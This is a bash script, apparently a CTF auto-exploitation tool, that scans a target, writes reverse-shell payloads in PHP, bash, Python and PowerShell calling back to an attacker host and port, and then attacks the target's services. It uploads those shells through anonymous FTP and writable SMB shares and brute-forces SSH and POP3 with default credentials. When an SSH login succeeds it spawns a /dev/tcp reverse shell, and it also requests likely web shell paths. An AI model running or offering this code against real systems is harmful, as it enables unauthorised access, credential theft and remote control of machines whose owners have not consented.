#!/bin/bash

# ============================================
# CTF Recon + Auto-Exploit Script v1
# Author: CyberXploit
# Usage: ./script.sh <TARGET_IP> <LHOST> <LPORT>
# ============================================

TARGET=$1
LHOST=$2
LPORT=$3

if [ -z "$TARGET" ] || [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo "Usage: scan <TARGET_IP> <LHOST> <LPORT>"
    echo "Example: scan 10.10.10.10 10.10.17.15 4444"
    exit 1
fi

BASE_DIR="recon_$TARGET"
PAYLOAD_DIR="$BASE_DIR/payloads"
EXPLOIT_DIR="$BASE_DIR/exploits"
LOG_FILE="$BASE_DIR/exploit.log"

mkdir -p $BASE_DIR $PAYLOAD_DIR $EXPLOIT_DIR

echo "[+] Target: $TARGET"
echo "[+] LHOST: $LHOST | LPORT: $LPORT"
echo "[+] Output: $BASE_DIR/"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a $LOG_FILE
}

# ============================================
# 1. RustScan
# ============================================
log "Running RustScan..."
rustscan -a $TARGET --ulimit 5000 --range 1-65535 > $BASE_DIR/rustscan_ports.txt

OPEN_PORTS=$(grep -oP 'Open \K[0-9.]+:[0-9]+' $BASE_DIR/rustscan_ports.txt | cut -d':' -f2 | sort -n | uniq | tr '\n' ',' | sed 's/,$//')

if [ -z "$OPEN_PORTS" ]; then
    OPEN_PORTS=$(grep -oP '\d{1,5}/open' $BASE_DIR/rustscan_ports.txt | cut -d '/' -f1 | sort -n | uniq | tr '\n' ',' | sed 's/,$//')
fi

log "Open Ports: $OPEN_PORTS"

if [ -z "$OPEN_PORTS" ]; then
    log "No open ports. Exiting."
    exit 1
fi

# ============================================
# 2. Nmap
# ============================================
log "Running Nmap..."
nmap -Pn -sC -sV -p$OPEN_PORTS $TARGET -oA $BASE_DIR/nmap_scan

# ============================================
# 3. Payloads
# ============================================
generate_payloads() {
    log "Generating payloads..."
    
    cat > $PAYLOAD_DIR/shell.php << EOF
<?php system("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"); ?>
EOF

    cat > $PAYLOAD_DIR/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
    chmod +x $PAYLOAD_DIR/shell.sh

    cat > $PAYLOAD_DIR/shell.py << EOF
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$LHOST",$LPORT))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
    chmod +x $PAYLOAD_DIR/shell.py

    cat > $PAYLOAD_DIR/shell.ps1 << EOF
\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
}
\$client.Close()
EOF
}

# ============================================
# 4. Auto-Exploit Functions
# ============================================

exploit_ftp() {
    mkdir -p $EXPLOIT_DIR/ftp
    cd $EXPLOIT_DIR/ftp
    log "FTP (21) - Testing anonymous..."
    echo "quit" | ftp -n $TARGET 2>&1 | tee ftp_anon.txt
    if grep -q "230" ftp_anon.txt; then
        log "[+] FTP anonymous success! Uploading shell..."
        echo -e "put $PAYLOAD_DIR/shell.php\nquit" | ftp -n $TARGET 2>&1 | tee ftp_upload.txt
        echo -e "put $PAYLOAD_DIR/shell.sh\nquit" | ftp -n $TARGET 2>&1 | tee -a ftp_upload.txt
        log "[+] Shell uploaded to FTP"
    fi
    cd - > /dev/null
}

exploit_ssh() {
    mkdir -p $EXPLOIT_DIR/ssh
    cd $EXPLOIT_DIR/ssh
    log "SSH (22) - Default credentials..."
    for user in root admin user test ubuntu debian pi toor; do
        for pass in "" root admin password toor 123456 test ubuntu welcome; do
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$TARGET "id" 2>/dev/null
            if [ $? -eq 0 ]; then
                log "[!] SSH Creds: $user:$pass"
                echo "$user:$pass" > ssh_creds.txt
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$TARGET "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" 2>/dev/null &
                log "[+] Reverse shell spawned!"
            fi
        done
    done
    cd - > /dev/null
}

exploit_web() {
    PORT=$1
    DIR="$EXPLOIT_DIR/web_$PORT"
    mkdir -p $DIR
    cd $DIR
    
    log "HTTP($PORT) - Enumerating..."
    whatweb http://$TARGET:$PORT 2>/dev/null | tee whatweb.txt
    
    # Quick common paths
    log "  - Checking common paths..."
    for path in admin login upload files images backup config .git .env phpinfo robots.txt; do
        curl -s -o /dev/null -w "%{http_code}" http://$TARGET:$PORT/$path | grep -q "200\|403" && echo "[+] Found: $path" >> common_paths.txt
    done
    
    # FFUF
    log "  - FFUF directory fuzzing..."
    ffuf -u http://$TARGET:$PORT/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak -o ffuf_dir.json -of json -ac > /dev/null 2>&1
    
    log "  - FFUF subdomain fuzzing..."
    ffuf -u http://$TARGET:$PORT -H "Host: FUZZ.$TARGET" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o ffuf_host.json -of json -ac > /dev/null 2>&1
    
    # Auto-trigger any found shells
    for shell in shell.php trigger.php cmd.php backdoor.php; do
        curl -s "http://$TARGET:$PORT/$shell" 2>/dev/null &
        curl -s "http://$TARGET:$PORT/uploads/$shell" 2>/dev/null &
        curl -s "http://$TARGET:$PORT/files/$shell" 2>/dev/null &
    done
    
    cd - > /dev/null
}

exploit_smb() {
    mkdir -p $EXPLOIT_DIR/smb
    cd $EXPLOIT_DIR/smb
    log "SMB (139/445) - Enumerating..."
    
    smbclient -L //$TARGET/ -N 2>&1 | tee smb_shares.txt
    smbclient //$TARGET/IPC$ -N -c "dir" 2>&1 | tee smb_null.txt
    
    # Try writable shares
    for share in $(cat smb_shares.txt | grep -oP '^\s+\K\S+' | grep -v "ADMIN\|C\$\|IPC\$" | grep -v "^$"); do
        smbclient //$TARGET/$share -N -c "put /dev/null test_write.txt" 2>/dev/null
        if [ $? -eq 0 ]; then
            log "[+] Write access to $share! Uploading..."
            smbclient //$TARGET/$share -N -c "put $PAYLOAD_DIR/shell.php shell.php" 2>/dev/null
            smbclient //$TARGET/$share -N -c "put $PAYLOAD_DIR/shell.ps1 shell.ps1" 2>/dev/null
            log "[+] Payload uploaded to //$TARGET/$share/"
        fi
    done
    
    crackmapexec smb $TARGET 2>&1 | tee cme_smb.txt
    cd - > /dev/null
}

exploit_mail() {
    mkdir -p $EXPLOIT_DIR/mail
    cd $EXPLOIT_DIR/mail
    
    if echo "$OPEN_PORTS" | grep -q "110"; then
        log "POP3 (110) - Checking..."
        echo -e "quit\n" | nc -n $TARGET 110 2>&1 | tee pop3_banner.txt
    fi
    
    if echo "$OPEN_PORTS" | grep -q "143"; then
        log "IMAP (143) - Checking..."
        echo -e "a1 LOGOUT\n" | nc -n $TARGET 143 2>&1 | tee imap_banner.txt
    fi
    
    # Try common credentials
    for user in root admin user test mail; do
        for pass in "" password test 123456 welcome; do
            echo -e "user $user\npass $pass\nquit" | nc -n $TARGET 110 2>/dev/null | grep -q "+OK" && echo "[+] POP3: $user:$pass" >> mail_creds.txt
        done
    done
    
    cd - > /dev/null
}

exploit_rpc() {
    mkdir -p $EXPLOIT_DIR/rpc
    cd $EXPLOIT_DIR/rpc
    log "RPC (111) - Enumerating..."
    
    rpcinfo -p $TARGET 2>&1 | tee rpcinfo.txt
    
    if grep -q "nfs" rpcinfo.txt; then
        log "[+] NFS found! Listing exports..."
        showmount -e $TARGET 2>&1 | tee nfs_exports.txt
        
        # Auto-mount if possible
        if grep -q "/" nfs_exports.txt; then
            log "  - Attempting to mount NFS..."
            sudo mkdir -p /mnt/nfs_$TARGET 2>/dev/null
            sudo mount -t nfs $TARGET:/ /mnt/nfs_$TARGET 2>/dev/null
            if [ $? -eq 0 ]; then
                log "[+] NFS mounted to /mnt/nfs_$TARGET"
                ls -la /mnt/nfs_$TARGET/ 2>&1 | tee nfs_files.txt
            fi
        fi
    fi
    
    cd - > /dev/null
}

# ============================================
# 5. Run All Exploits
# ============================================

generate_payloads

if echo "$OPEN_PORTS" | grep -q "21"; then exploit_ftp; fi
if echo "$OPEN_PORTS" | grep -q "22"; then exploit_ssh; fi
if echo "$OPEN_PORTS" | grep -q "80"; then exploit_web 80; fi
if echo "$OPEN_PORTS" | grep -q "443"; then exploit_web 443; fi
if echo "$OPEN_PORTS" | grep -q "110\|143"; then exploit_mail; fi
if echo "$OPEN_PORTS" | grep -q "111"; then exploit_rpc; fi
if echo "$OPEN_PORTS" | grep -qE "139|445"; then exploit_smb; fi
if echo "$OPEN_PORTS" | grep -qE "8080|8000|8888|8443"; then
    for PORT in 8080 8000 8888 8443; do
        if echo "$OPEN_PORTS" | grep -q "$PORT"; then exploit_web $PORT; fi
    done
fi

# ============================================
# 6. Summary
# ============================================
echo ""
echo "=========================================="
log "Scan Complete!"
echo "=========================================="
echo ""
echo "[+] Target: $TARGET"
echo "[+] Ports: $OPEN_PORTS"
echo "[+] Results: $BASE_DIR/"
echo ""

# Show credentials found
echo "===== CREDENTIALS FOUND ====="
find $EXPLOIT_DIR -name "*creds*.txt" -exec cat {} \; 2>/dev/null | grep -v "Logging"
echo ""

# Show NFS mount
if [ -d "/mnt/nfs_$TARGET" ]; then
    echo "===== NFS MOUNT ====="
    echo "NFS mounted to: /mnt/nfs_$TARGET"
    ls -la /mnt/nfs_$TARGET/ 2>/dev/null
    echo ""
fi

# Quick commands
echo "===== QUICK COMMANDS ====="
if [ -f $EXPLOIT_DIR/ssh/ssh_creds.txt ]; then
    echo "  SSH: ssh $(cat $EXPLOIT_DIR/ssh/ssh_creds.txt)@$TARGET"
fi
if [ -f $EXPLOIT_DIR/smb/smb_shares.txt ]; then
    echo "  SMB: smbclient -L //$TARGET -N"
fi
if [ -f $EXPLOIT_DIR/rpc/nfs_exports.txt ]; then
    echo "  NFS: sudo mount -t nfs $TARGET:/export /mnt/nfs_$TARGET"
fi
if [ -f $EXPLOIT_DIR/mail/mail_creds.txt ]; then
    echo "  MAIL: $(cat $EXPLOIT_DIR/mail/mail_creds.txt)"
fi

echo ""
echo "[+] Listener: nc -lvnp $LPORT"
echo "[+] Happy Hacking! 🚀"

